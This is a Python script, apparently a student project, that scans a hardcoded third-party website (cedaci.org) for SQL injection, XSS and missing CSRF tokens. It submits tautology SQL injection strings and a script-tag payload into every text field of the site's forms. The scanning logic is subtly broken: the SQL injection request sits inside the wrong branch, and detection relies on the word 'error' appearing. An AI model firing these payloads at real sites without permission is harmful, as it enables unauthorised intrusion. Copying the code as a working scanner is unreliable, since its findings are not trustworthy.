import requests
from bs4 import BeautifulSoup

class Lsbu_Vulnerability:

    def __init__(self, url):
        self.xss=False
        self.csrf=False 
        self.sqli=False 
        self.url = url
        self.session = requests.Session()
#run all
    def scan(self):
        self.scan_sql_injection()
        self.scan_xss()
        self.scan_csrf()

        



    def scan_sql_injection(self):
        response = self.session.get(self.url)
        soup = BeautifulSoup(response.content, "html.parser")
        forms = soup.find_all("form")

        for form in forms:
            action = form.get("action")
            if not action:
                continue

            # injection payloads 
            payloads = [
                "' OR 1=1 --",
                "\" OR 1=1 --",
                "' OR 'a'='a",
                "\" OR \"a\"=\"a"
            ]

            for payload in payloads:
                data = {}
                for input_field in form.find_all("input"):
                    input_name = input_field.get("name")
                    input_type = input_field.get("type")

                    if input_type == "submit":
                        continue

                    if input_type == "text":
                        data[input_name] = payload
                    else:
                        data[input_name] = input_field.get("value", "")

                        # send payload to target 
                        response = self.session.post(self.url + action, data=data)

                        # check sql succesufull
                        if "error" in response.content.decode().lower():
                            print(f"[!] Possible SQL Injection vulnerability found in {action}")



    def scan_xss(self):
        response = self.session.get(self.url)
        soup = BeautifulSoup(response.content, "html.parser")
        forms = soup.find_all("form")

        for form in forms:
            action = form.get("action")
            if not action:
                continue
                

            # xss payload  
            payload = "<script>alert('XSS')</script>"

            data = {}
            for input_field in form.find_all("input"):
                input_name = input_field.get("name")
                input_type = input_field.get("type")

                if input_type == "submit":
                    continue

                if input_type == "text":
                    data[input_name] = payload
                else:
                    data[input_name] = input_field.get("value", "")

              # send the payload form
            response = self.session.post(self.url + action, data=data)

              # check if was successful
            if payload in response.content.decode():
                print(f"[!] Possible XSS vulnerability found in {action}")

            else:
                print(f"[#] NO XSS vulnerability found in {action}")


    def scan_csrf(self):
        response = self.session.get(self.url)
        soup = BeautifulSoup(response.content, "html.parser")
        forms = soup.find_all("form")

        for form in forms:
            csrf_token = form.find("input", attrs={"name": "csrfmiddlewaretoken"})
            if not csrf_token:
                print(f"[!] Possible CSRF vulnerability found in {form.get('action')}")


if __name__ == "__main__":
    target_url = "https://www.cedaci.org/"
    scanner = Lsbu_Vulnerability(target_url)
    scanner.scan()

